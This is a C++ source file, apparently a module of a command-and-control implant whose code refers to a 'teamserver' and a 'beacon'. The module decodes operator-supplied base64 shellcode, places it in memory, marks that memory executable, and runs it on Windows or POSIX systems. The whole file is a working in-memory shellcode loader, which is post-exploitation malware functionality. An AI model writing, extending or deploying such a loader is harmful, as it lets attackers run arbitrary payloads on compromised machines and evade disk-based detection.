// mem_exec module (B6).
//
// Allocates RW memory, copies shellcode in, then runs it on a new thread.
// The shellcode comes in as base64 in arguments[0] (the teamserver base64-
// encodes it). arguments[1] is an optional mode:
//   "thread"   (default) — CreateThread on Windows, pthread_create on POSIX
//   "inline"           — execute on the calling thread (risky, blocks beacon)
//
// On Windows the memory is allocated as PAGE_READWRITE then protected as
// PAGE_EXECUTE_READ after the copy. On POSIX the equivalent is mmap PROT_READ
// followed by mprotect PROT_READ|PROT_EXEC.

#include "../protocol.h"

#include <array>
#include <cstring>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>

namespace {

std::vector<unsigned char> b64_decode(const std::string& s) {
    static const std::string alpha =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::array<int, 256> lut{};
    lut.fill(-1);
    for (int i = 0; i < 64; ++i) lut[(unsigned char)alpha[i]] = i;
    std::vector<unsigned char> out;
    int val = 0, bits = -8;
    for (unsigned char c : s) {
        if (c == '=') break;
        if (c == ' ' || c == '\n' || c == '\r' || c == '\t') continue;
        int v = lut[c];
        if (v < 0) return {};
        val = (val << 6) + v;
        bits += 6;
        if (bits >= 0) {
            out.push_back((unsigned char)((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

} // namespace

#ifdef _WIN32
#include <windows.h>

namespace nagomio_modules {

std::string handle_mem_exec(const std::vector<std::string>& args) {
    if (args.empty()) {
        return R"JSON({"error":"shellcode is required (base64)"})JSON";
    }
    auto sc = b64_decode(args[0]);
    if (sc.empty()) {
        return R"JSON({"error":"invalid base64"})JSON";
    }
    bool inline_mode = args.size() > 1 && args[1] == "inline";

    void* mem = VirtualAlloc(nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        return std::string(R"JSON({"error":"VirtualAlloc failed"})JSON");
    }
    std::memcpy(mem, sc.data(), sc.size());
    DWORD old_prot = 0;
    if (!VirtualProtect(mem, sc.size(), PAGE_EXECUTE_READ, &old_prot)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return std::string(R"JSON({"error":"VirtualProtect failed"})JSON");
    }
    auto fn = reinterpret_cast<LPTHREAD_START_ROUTINE>(mem);
    if (inline_mode) {
        fn(nullptr);
        VirtualFree(mem, 0, MEM_RELEASE);
        return R"JSON({"status":"ran_inline"})JSON";
    }
    HANDLE h = CreateThread(nullptr, 0, fn, nullptr, 0, nullptr);
    if (!h) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return std::string(R"JSON({"error":"CreateThread failed"})JSON");
    }
    CloseHandle(h);
    return std::string("{\"status\":\"spawned\",\"size\":") + std::to_string(sc.size()) + "}";
}

} // namespace nagomio_modules

#else
#include <sys/mman.h>
#include <unistd.h>

namespace nagomio_modules {

std::string handle_mem_exec(const std::vector<std::string>& args) {
    if (args.empty()) {
        return R"JSON({"error":"shellcode is required (base64)"})JSON";
    }
    auto sc = b64_decode(args[0]);
    if (sc.empty()) {
        return R"JSON({"error":"invalid base64"})JSON";
    }
    bool inline_mode = args.size() > 1 && args[1] == "inline";

    void* mem = mmap(nullptr, sc.size(), PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        return std::string(R"JSON({"error":"mmap failed"})JSON");
    }
    std::memcpy(mem, sc.data(), sc.size());
    if (mprotect(mem, sc.size(), PROT_READ | PROT_EXEC) != 0) {
        munmap(mem, sc.size());
        return std::string(R"JSON({"error":"mprotect failed"})JSON");
    }
    auto fn = reinterpret_cast<void (*)()>(mem);
    if (inline_mode) {
        fn();
        munmap(mem, sc.size());
        return R"JSON({"status":"ran_inline"})JSON";
    }
    std::thread([mem, sc_size = sc.size()]() {
        auto f = reinterpret_cast<void (*)()>(mem);
        f();
        munmap(mem, sc_size);
    }).detach();
    return std::string("{\"status\":\"spawned\",\"size\":") + std::to_string(sc.size()) + "}";
}

} // namespace nagomio_modules
#endif
